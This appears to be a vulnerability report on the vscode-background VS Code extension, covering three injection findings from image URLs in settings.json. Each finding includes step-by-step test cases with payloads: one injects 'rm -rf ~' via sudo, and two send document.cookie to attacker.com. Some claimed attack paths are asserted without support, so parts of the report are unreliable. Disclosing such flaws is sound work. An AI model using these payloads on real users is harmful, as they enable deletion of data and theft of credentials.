# Vulnerabilities in vscode-background

## 1. Command Injection via Malicious Image URLs

**Description**: The VSCode Background extension allows users to specify URLs for background images. However, there's a critical vulnerability in how these URLs are handled when executing privileged commands. When a user has insufficient permissions to write to VSCode files, the extension uses sudo to execute a move command, but fails to properly validate or sanitize the image URLs, which are directly concatenated into the command string. A malicious actor could craft a repository with a settings.json file that includes a specially crafted URL containing shell command injection characters.

**Impact**: This vulnerability allows arbitrary command execution with elevated privileges on the victim's system. An attacker could execute commands as root/administrator, potentially leading to complete system compromise, data theft, or installation of persistent malware.

**Vulnerability Rank**: Critical

**Currently Implemented Mitigations**: The extension attempts to quote file paths in the move command, but does not properly validate or sanitize user-provided image URLs.

**Missing Mitigations**: 
- Validate that image URLs contain only safe characters
- Use a whitelist approach to only allow specific protocols (https://, file://)
- Implement proper sanitization of URLs before using them in command execution
- Use safer APIs for file operations instead of shell commands

**Preconditions**: 
- Victim must have the vscode-background extension installed
- Victim must open a repository with a maliciously crafted .vscode/settings.json file
- The victim must have insufficient permissions to write to VSCode files, triggering the sudo execution path

**Source Code Analysis**: 
The vulnerability exists in the `AbsPatchFile.base.ts` file where file operations are performed. When a user doesn't have write permissions, the extension attempts to use sudo:

```typescript
// AbsPatchFile.base.ts
const mvcmd = process.platform === 'win32' ? 'move /Y' : 'mv -f';
const cmdarg = `${mvcmd} "${tempFilePath}" "${filePath}"`;
await _.sudoExec(cmdarg, { name: 'Background Extension' });
```

The key issue is that `tempFilePath` can be influenced by user-provided image URLs. When a malicious URL is provided in settings.json, the extension saves this content to a temp file, which is then moved using sudo. If the URL contains shell metacharacters, they can break out of the quoted string and inject arbitrary commands.

This is particularly dangerous because:
1. The command is executed with elevated privileges via sudo
2. There's no validation of URL protocols or contents
3. The command is constructed via string concatenation

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file containing:
```json
{
  "background.fullscreen": {
    "images": ["file:///tmp/"; rm -rf ~ #"]
  }
}
```

2. Push this repository to a public Git hosting service
3. Convince a victim who has the vscode-background extension installed to open this repository
4. When the victim opens the repository and doesn't have sufficient permissions to modify VSCode files:
   - The extension will attempt to use sudo to move files
   - The malicious command will be executed with elevated privileges
   - The victim's home directory will be deleted

## 2. Remote Code Execution via javascript: Protocol URLs

**Description**: The extension allows users to specify URLs for background images but doesn't validate that these URLs use safe protocols. The URLs are injected into VSCode's core JavaScript files and used in CSS background-image properties. A malicious actor could craft a repository with a settings.json file that includes a javascript: URL as a background image, which could be executed in the context of VSCode's Electron environment.

**Impact**: This could lead to remote code execution within the context of the VSCode application, allowing an attacker to steal sensitive information, access local files, or execute arbitrary commands on the victim's system.

**Vulnerability Rank**: High

**Currently Implemented Mitigations**: The extension normalizes file:// URLs to vscode-file:// protocol, but it doesn't validate that non-file URLs are using safe protocols.

**Missing Mitigations**: The extension should validate that image URLs use only safe protocols (like https://, http://, file://, vscode-file://) and reject URLs using potentially dangerous protocols (like javascript:, data:, etc.).

**Preconditions**: 
- Victim must have the vscode-background extension installed
- Victim must open a repository with a maliciously crafted settings.json file

**Source Code Analysis**: 
In `PatchGenerator.base.ts`, the `normalizeImageUrls` method only checks if URLs start with "file://" but doesn't validate other protocols:

```typescript
protected normalizeImageUrls(images: string[]) {
    return images.map(imageUrl => {
        if (!imageUrl.startsWith('file://')) {
            return imageUrl;
        }

        // file:///Users/foo/bar.png => vscode-file://vscode-app/Users/foo/bar.png
        const url = imageUrl.replace('file://', 'vscode-file://vscode-app');
        return vscode.Uri.parse(url).toString();
    });
}
```

These unvalidated URLs are then embedded in JavaScript and CSS for background images:

```typescript
// In FullscreenPatchGenerator.ts
function setNextImg() {
    document.body.style.setProperty(cssvariable, 'url(' + getNextImg() + ')');
}
```

Since VSCode runs in an Electron environment, which is based on Chromium, javascript: URLs in certain contexts could be executed, especially since the extension modifies VSCode's core JavaScript files.

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file that includes a JavaScript URL as a background image:
```json
{
  "background.editor": {
    "images": ["javascript:fetch('https://attacker.com/steal?data='+document.cookie)"]
  }
}
```

2. Push this repository to a public Git hosting service
3. Convince a victim who has the vscode-background extension installed to open this repository
4. When the victim opens the repository, the extension would embed the javascript: URL in VSCode's core JavaScript files
5. If the URL is executed in VSCode's Electron environment, it would send the victim's cookie data to the attacker's server

## 3. Code Injection via Malformed Image URLs

**Description**: The extension allows users to specify custom image URLs which are injected directly into VSCode's JavaScript files. While the URLs are JSON-stringified when embedded in arrays, they're later concatenated directly into JavaScript strings without additional validation. A malicious actor could craft a repository with a settings.json file containing specially crafted URLs that, when processed by the extension, could lead to code injection.

**Impact**: This vulnerability allows remote code execution within the context of the VSCode application, enabling an attacker to access sensitive information, modify files, or execute arbitrary commands.

**Vulnerability Rank**: High

**Currently Implemented Mitigations**: The extension uses JSON.stringify for arrays of URLs, which provides some protection against basic string breaking attacks.

**Missing Mitigations**: 
- Implement strict validation of image URLs, allowing only safe protocols and characters
- Use proper encoding/escaping when embedding user-provided values in JavaScript
- Consider using safer alternatives to direct string concatenation for dynamic values

**Preconditions**: 
- Victim must have the vscode-background extension installed
- Victim must open a repository with a maliciously crafted settings.json file

**Source Code Analysis**: 
In various PatchGenerator classes, user-provided URLs are embedded in generated JavaScript. For example, in FullscreenPatchGenerator.ts:

```typescript
protected getScript(): string {
    const { images, random, interval } = this.curConfig;
    return `
const cssvariable = '${this.cssvariable}';
const images = ${JSON.stringify(images)};
const random = ${random};
const interval = ${interval};

// ... more code ...

function setNextImg() {
    document.body.style.setProperty(cssvariable, 'url(' + getNextImg() + ')');
}

// ... more code ...
    `;
}
```

While the URLs in the images array are JSON-stringified, they're later used in direct string concatenation in setNextImg(). If a URL could somehow break out of the string context or manipulate the JavaScript execution flow, it could lead to code injection.

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file containing carefully crafted URLs designed to break out of string contexts:
```json
{
  "background.fullscreen": {
    "images": ["\\"); eval(\"fetch('https://attacker.com/steal?data='+document.cookie)\"); (\""]
  }
}
```

2. Push this repository to a public Git hosting service
3. Convince a victim who has the vscode-background extension installed to open this repository
4. When the victim opens the repository, the extension would inject the malicious code into VSCode's JavaScript files
5. If the injection succeeds, the code would execute and send sensitive data to the attacker's server
